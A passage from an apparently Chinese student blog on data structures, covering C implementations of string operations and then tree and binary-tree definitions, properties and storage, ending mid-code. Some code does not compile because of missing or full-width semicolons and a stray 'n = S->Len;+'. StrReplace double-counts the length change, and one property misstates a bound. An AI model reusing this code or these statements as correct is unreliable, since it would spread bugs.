class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SubString</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* Sub, <span class="keyword">int</span> pos, <span class="keyword">int</span> len)</span> <span class="comment">//求子串函数，用Sub返回串S的第pos个字符起长度为len的子串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">if</span> (pos&lt;<span class="number">1</span> || pos&gt;S-&gt;Len || len&lt;<span class="number">1</span> || len&gt;S-&gt;Len - pos + <span class="number">1</span>) <span class="comment">//范围错误</span></span><br><span class="line">{</span><br><span class="line">Sub-&gt;Len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">{</span><br><span class="line">Sub-&gt;ch[j] = S-&gt;ch[pos + j - <span class="number">1</span>]; <span class="comment">//新串Sub赋值</span></span><br><span class="line">}</span><br><span class="line">Sub-&gt;ch[j] = <span class="string">'\0'</span>; <span class="comment">//新串尾部加上字符串结束标志</span></span><br><span class="line">Sub-&gt;Len = len; <span class="comment">//规定长度</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="删除子串"><a href="#删除子串" class="headerlink" title="删除子串"></a>删除子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrDelete</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">int</span> i, <span class="keyword">int</span> l)</span> <span class="comment">//删除子串，在S中删除第i开始连续l个字符</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (i + l - <span class="number">1</span> &gt; S-&gt;Len)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"子串超界"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = i + l - <span class="number">1</span>; k &lt; S-&gt;Len; k++, i++) <span class="comment">//从第i位开始删除长度为l个字符</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i - <span class="number">1</span>] = S-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = S-&gt;Len - l; <span class="comment">//长度-l</span></span><br><span class="line">S-&gt;ch[S-&gt;Len] = <span class="string">'\0'</span>; <span class="comment">//新串尾部加上字符串结束标志</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="插入子串"><a href="#插入子串" class="headerlink" title="插入子串"></a>插入子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrInsert</span><span class="params">(<span class="keyword">String</span> *S,<span class="keyword">String</span> *T,<span class="keyword">int</span> i)</span> <span class="comment">//串S中第i个字符插入子串T</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (i &gt; S-&gt;Len + <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"插入位置错误"</span>)；</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(S-&gt;Len+T-&gt;Len&gt;MAXSIZE)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"两串长度超过存储空间长度"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = S-&gt;Len - <span class="number">1</span>; k &gt;= i - <span class="number">1</span>; k--) <span class="comment">//将第i位开始的字符各向后移动T串长度</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[T-&gt;Len + k] = S-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; T-&gt;Len; k++) <span class="comment">//将子串T插入到串S的第i位处</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i + k - <span class="number">1</span>] = T-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = S-&gt;Len + T-&gt;Len; <span class="comment">//修改串S的长度</span></span><br><span class="line">S-&gt;ch[S-&gt;Len] = <span class="string">'\0'</span>; <span class="comment">//新串S尾部加上字符串结束标志</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="定位子串"><a href="#定位子串" class="headerlink" title="定位子串"></a>定位子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrIndex</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T)</span> <span class="comment">//串的定位函数，若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置(第几个字符，不是下标)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k;</span><br><span class="line"><span class="keyword">while</span> (i &lt; S-&gt;Len &amp;&amp; j &lt; T-&gt;Len) <span class="comment">//当两串指针没指向该串尾时进行比较</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;ch[i] == T-&gt;ch[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T-&gt;Len) <span class="comment">//串S中有串T</span></span><br><span class="line">{</span><br><span class="line">k = i - T-&gt;Len + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">k = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> k;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrCompare</span><span class="params">(<span class="keyword">String</span>* S1, <span class="keyword">String</span>* S2)</span><span class="comment">//判断两个串是否相等</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (S1-&gt;ch[i] != <span class="string">'\0'</span> &amp;&amp; S2-&gt;ch[i] != <span class="string">'\0'</span>) <span class="comment">//当两串没到串尾部时</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (S1-&gt;ch[i] != S2-&gt;ch[i]) <span class="comment">//两串对应位置的字符是否相同</span></span><br><span class="line">{</span><br><span class="line">flag = <span class="number">1</span>; <span class="comment">//标志置为1</span></span><br><span class="line"><span class="keyword">break</span>; <span class="comment">//结束循环</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">i++; <span class="comment">//计数</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span> &amp;&amp; S1-&gt;Len == S2-&gt;Len) <span class="comment">//两串长度相同且所有字符都相同，两串相等</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> S1-&gt;ch[i] - S2-&gt;ch[i]; <span class="comment">//返回对应第一个不相同位置字符ASCII码差值</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrCat</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T)</span> <span class="comment">//连接函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, flag;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;Len + T-&gt;Len &lt;= MAXSIZE) <span class="comment">//连接后串长小于MAXSIZE</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = S-&gt;Len; i &lt; S-&gt;Len + T-&gt;Len; i++)</span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i] = T-&gt;ch[i - S-&gt;Len]; <span class="comment">//赋值连接</span></span><br><span class="line">}</span><br><span class="line">S-&gt;ch[i] = <span class="string">'\0'</span>;</span><br><span class="line">S-&gt;Len += T-&gt;Len; <span class="comment">//长度相加</span></span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (S-&gt;Len &lt; MAXSIZE) <span class="comment">//连接后串长大于MAXSIZE，但串S长度小于MAXSIZE，连接后串T部分字符序列被舍弃</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = S-&gt;Len; i &lt; MAXSIZE; i++)</span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i] = T-&gt;ch[i - S-&gt;Len];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = MAXSIZE;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//串S的长度等于MAXSIZE，串T不被连接</span></span><br><span class="line">{</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="子串替换"><a href="#子串替换" class="headerlink" title="子串替换"></a>子串替换</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrReplace</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T, <span class="keyword">String</span>* V)</span> <span class="comment">//子串替换，用串V替换串S中出现得到所有与T相等的不重叠子串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, m, n, p, q;</span><br><span class="line">n = S-&gt;Len;</span><br><span class="line">m = T-&gt;Len;</span><br><span class="line">q = V-&gt;Len;</span><br><span class="line">p = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">i = StrIndex(S, T); <span class="comment">//调用定位函数得到子串T在子串S的位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">-1</span>) <span class="comment">//当主串S有该子串T时</span></span><br><span class="line">{</span><br><span class="line">StrDelete(S, i, m); <span class="comment">//删除子串T</span></span><br><span class="line">StrInsert(S, V, i); <span class="comment">//插入子串V</span></span><br><span class="line">p = i + q;</span><br><span class="line">S-&gt;Len = S-&gt;Len + q - m; <span class="comment">//修改主串S的长度</span></span><br><span class="line">n = S-&gt;Len;+</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">while</span> ((p &lt;= n - m + <span class="number">1</span>) &amp;&amp; (i != <span class="number">-1</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>串这部分内容呢比较简单，后面还有广义表和KMP算法，这里先不讲了；下周直接学非线性结构；</p><p>Bye Bye~</p><h1 id="树—Tree"><a href="#树—Tree" class="headerlink" title="树—Tree"></a>树—Tree</h1><p>早就对 ”树“ 有所耳闻了，今日一会，果然名不虚传；</p><h2 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h2><h3 id="定义-8"><a href="#定义-8" class="headerlink" title="定义"></a>定义</h3><p>树（Tree）是n（n≥0）个结点的有限集；n=0时称为空树；在任意一棵非空树中：</p><p>(1) 有且仅有一个特定的称为根（Root）的结点；</p><p>(2) 当n&gt;1时，其余结点可分为m（m&gt;0）个互不相交的有限集T1、T2、……、Tm，其中每一个集合本身又是一棵</p><p>树，并且称为根的子树（SubTree）；</p><h3 id="树的表示方法"><a href="#树的表示方法" class="headerlink" title="树的表示方法"></a>树的表示方法</h3><p>1、树形表示法：使用一棵倒置的树表示，如下图（1）所示；</p><p>2、嵌套集合表示法：使用集合以及集合的包含关系描述树结构，如图（2）所示；</p><p>3、凹入表表示法：使用线段的伸缩关系描述树的结构，如图（3）所示；</p><p>4、广义表表示法：将树的根结点写在括号的左边 ，除根结点外的其余结点写在括号内并用逗号间隔来描述树的结</p><p>构，如图（4）所示；</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A0%91%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png" alt="树的表示方法"></p><h3 id="树的基本术语z"><a href="#树的基本术语z" class="headerlink" title="树的基本术语z"></a>树的基本术语z</h3><p><strong>(１) 结点———树的结点包含一个数据元素及若干指向其子树的分支；</strong></p><p><strong>(２) 结点的度———结点所拥有的分支数目或后继结点个数称为该结点的度；</strong> </p><p><strong>(３) 树的度———树中各结点度的最大值称为该树的度；</strong></p><p><strong>(４) 叶结点 (终端结点) ———度为零的结点称为叶结点；</strong></p><p><strong>(５) 分支结点 (非终端结点) ———度不为零的结点称为分支结点；</strong></p><p><strong>(６) 孩子、双亲结点———一个结点的子树的根称为该结点的孩子；该结点称为孩子的双亲；</strong></p><p><strong>( 7 ) 兄弟结点———同一双亲结点下的孩子结点互称为兄弟结点；</strong></p><p><strong>( 8 ) 堂兄弟———双亲互为兄弟的两个结点互称为堂兄弟；</strong></p><p><strong>( 9 ) 子孙结点———一个结点的所有子树中的结点称之为该结点的子孙结点；</strong></p><p><strong>(10) 祖先结点———从树根结点到达一个结点的路径上的所有结点称为该结点的祖先结点</strong></p><p><strong>(11) 结点的层次———树的根结点的层次为１，其余结点的层次等于它双亲结点的层次加１；（某结点在第L层，</strong></p><p><strong>它的子树的根就在L+1层）；</strong></p><p><strong>(12) 树的深度———树中结点的最大层次称为树的深度 (或高度)；</strong></p><p><strong>(13) 有序树和无序树———如果一棵树中的结点的各子树从左到右是有次序的， 即若交换了某结点各子树的相对</strong></p><p><strong>位置， 则构成了不同的树， 称这样的树为有序树，反之， 则为 无序树；</strong></p><p><strong>(14) 森林———ｍ (ｍ≥０) 棵互不相交树的集合称为森林；</strong></p><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="二叉树定义"><a href="#二叉树定义" class="headerlink" title="二叉树定义"></a>二叉树定义</h3><p><strong>二叉树（Binary Tree）是有n（n≥0）个结点的有限集合；该集合或者为空集（称为空二叉树），或者由一个</strong></p><p><strong>根结点和两颗互不相交的、分别称为根结点的左子树和右子树的二叉树组成；</strong></p><h3 id="二叉树的特点"><a href="#二叉树的特点" class="headerlink" title="二叉树的特点"></a>二叉树的特点</h3><p><strong>1、每个结点最多有两棵子树，所以二叉树中不存在度大于2的结点；</strong></p><p><strong>2、左子树和右子树是有顺序的，次序不能任意颠倒；</strong></p><p><strong>3、即使树中某结点只有一颗子树，也要区分它是左子树还是右子树；</strong></p><h3 id="二叉树的基本形态"><a href="#二叉树的基本形态" class="headerlink" title="二叉树的基本形态"></a>二叉树的基本形态</h3><p>二叉树具有5种基本形态：</p><p>1、空二叉树</p><p>2、只要一个根结点</p><p>3、根结点只有左子树</p><p>4、根结点只有右子树</p><p>5、根结点既有左子树又有右子树</p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p><strong>● 在二叉树的第i层上至多有2^(i-1)个结点（i≥0）;</strong></p><p><strong>● 深度为k的二叉树至多有2^k - 1个结点（k≥1）；</strong></p><p><strong>● 对任意一棵二叉树T， 如果其叶子结点数为n0，度为２的结点数为n2，则有n0 = n2+1;</strong></p><p><strong>● 具有ｎ个结点的完全二叉树的深度为[log2n]+1;([x]为不大于x的最大整数)</strong></p><p><strong>● 如果一棵有ｎ个结点的完全二叉树 (其深度为[log2n]+1) 的结点按层次编号 (从第1层到第[log2n]+1层，每层从左到右) 则对任一结点ｉ (1≤ｉ≤ｎ) 有:</strong> </p><p>​        <strong>➀ 如果 i＝1， 结点ｉ是根结点， 无双亲； 如果ｉ&gt;1， 则其双亲结点是结点i/2；</strong></p><p>​        <strong>➁ 如果 2i&gt;ｎ， 则结点ｉ无左孩子， 该结点为叶子结点， 否则其左孩子是结点2i ；</strong></p><p>​        <strong>➂ 如果 2i+1&gt;ｎ， 则结点ｉ无右孩子， 该结点为叶子结点， 否则其右孩子是结点 2i＋1；</strong></p><h3 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h3><h4 id="斜树"><a href="#斜树" class="headerlink" title="斜树"></a>斜树</h4><h5 id="定义-9"><a href="#定义-9" class="headerlink" title="定义"></a>定义</h5><p>所有的结点都是只有左子树的二叉树叫做左斜树，所有的结点都是只有右子树的二叉树叫做右斜树；这两者统称为</p><p>斜树；</p><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>每一层都只有一个结点，结点的个数与二叉树的深度相同；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%9C%E6%A0%91.png" alt="斜树"></p><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4><h5 id="定义-10"><a href="#定义-10" class="headerlink" title="定义"></a>定义</h5><p>在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二</p><p>叉树；</p><h5 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h5><p>满二叉树很符合强迫症患者，其特点有：</p><p>1、叶子只能出现在最下一层，出现在其它层就不可能达成平衡 ；</p><p>2、非叶子结点的度一定是2，否则就是“缺胳膊少腿”了；</p><p>3、在同样的深度的二叉树中，满二叉树的结点个数最多，叶子数最多；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%BB%A1%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="满二叉树"></p><h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4><h5 id="定义-11"><a href="#定义-11" class="headerlink" title="定义"></a>定义</h5><p>对一棵具有n个结点的二叉树按层序编号，如果编号为i（1≤i≤n）的结点与同样深度的满二叉树中编号为i的结点在</p><p>二叉树中位置完全相同，则这课二叉树称为完全二叉树；</p><h5 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h5><p>1、叶子结点只能出现在最下两层；</p><p>2、最下面的叶子一定集中在左部连续位置；</p><p>3、倒数二层，若有叶子结点，一定都在右部连续位置；</p><p>4、如果结点度为1，则该结点只有左孩子，即不存在只有右孩子的情况；</p><p>5、同样结点数的二叉树，完全二叉树的深度最小；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="完全二叉树"></p><p>// 判断某二叉树是否为完全二叉树：给每个结点按照满二叉树的结构逐层顺序编号，如果编号出现空档，就说明不</p><p>是完全二叉树，否则就是；</p><h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="二叉树的顺序存储结构"><a href="#二叉树的顺序存储结构" class="headerlink" title="二叉树的顺序存储结构"></a>二叉树的顺序存储结构</h4><p>二叉树的顺存储结构就是用一位数组存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点</p><p>之间的逻辑关系；编号过程：首先，把树的根节点的编号定为1，然后按照层次从上到下，从左到右的顺序对每一</p><p>结点进行编号，当一个结点的双亲结点的编号为i时，若它是左孩子，则编号为2i，若它是右孩子，则编号为2i+1;</p><p>但是这种存储结构会浪费大量的空间，一般适用于完全二叉树；</p><h4 id="二叉树的链式存储结构"><a href="#二叉树的链式存储结构" class="headerlink" title="二叉树的链式存储结构"></a>二叉树的链式存储结构</h4><h5 id="二叉链表"><a href="#二叉链表" class="headerlink" title="二叉链表"></a>二叉链表</h5><p>二叉树的每个结点最多有两个孩子，所以为它设计一个数据域和两个指针域，我们称这样的链表叫做二叉链表；</p><h5 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitTree(*T) <span class="comment">//构造空树T</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>、DestroyTree(*T) <span class="comment">//销毁树T</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>、CreateTree(*T,definition) <span class="comment">//按definition中给出树的定义来构造树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">4</span>、ClearTree(*T) <span class="comment">//若树T存在，则将树T清空为空树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">5</span>、TreeEmpty(T) <span class="comment">//若树为空树，返回true，否则返回false</span></span><br><span class="line">    </span><br><span class="line"><span class="number">6</span>、TreeDepth(T) <span class="comment">//返回T的深度</span></span><br><span class="line">    </span><br><span class="line"><span class="number">7</span>、Root(T) <span class="comment">//返回T的根节点</span></span><br><span class="line">    </span><br><span class="line"><span class="number">8</span>、Value(T,cur_e) <span class="comment">//cur_e是树T中一个结点，返回此结点的值</span></span><br><span class="line">    </span><br><span class="line"><span class="number">9</span>、Assign(T,cur_e,value) <span class="comment">//给树T的结点cur_e赋值为value</span></span><br><span class="line">    </span><br><span class="line"><span class="number">10</span>、Parent(T,cur_e) <span class="comment">//若cur_e是树T的非根结点，则返回它的双亲，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">11</span>、LsftChild(T,cur_e) <span class="comment">//若cur_e是树T的非叶结点，则返回它的最左孩子，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>、RightSibling(T,cur_e) <span class="comment">//若cur_e有右兄弟，则返回它的右兄弟，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">13</span>、InsertChild(*T,*p,i,c) <span class="comment">//其中p指向树T的某个结点，i为所指结点p的度加上1，非空树c与T不相交，操作结果为输入c为树T中p指结点的第i棵子树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">14</span>、DeleteChild(*T,*p,i) <span class="comment">//其中p指向树T的某个结点，i为所指结点p的度，操作结果为删除T中p所指结点的第i棵子树</span></span><br></pre></td></tr></tbody></table></figure><h5 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span></span><br><span class="line">}BTNode,*BTree;</span><br></pre></td></tr></tbody></table></figure><h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><h4 id="定义-12"><a href="#定义-12" class="headerlink" title="定义"></a>定义</h4><p><strong>二叉树的遍历（traversing binary tree）是指从根结点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次；</strong></p><p>以这棵树为例：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E9%81%8D%E5%8E%86%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="遍历二叉树"></p><h4 id="前序遍历（DLR）"><a href="#前序遍历（DLR）" class="headerlink" title="前序遍历（DLR）"></a>前序遍历（DLR）</h4><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、访问根结点</strong></p><p><strong>2、先序遍历根结点的左子树</strong></p><p><strong>3、先序遍历根结点的右子树</strong></p><h5 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 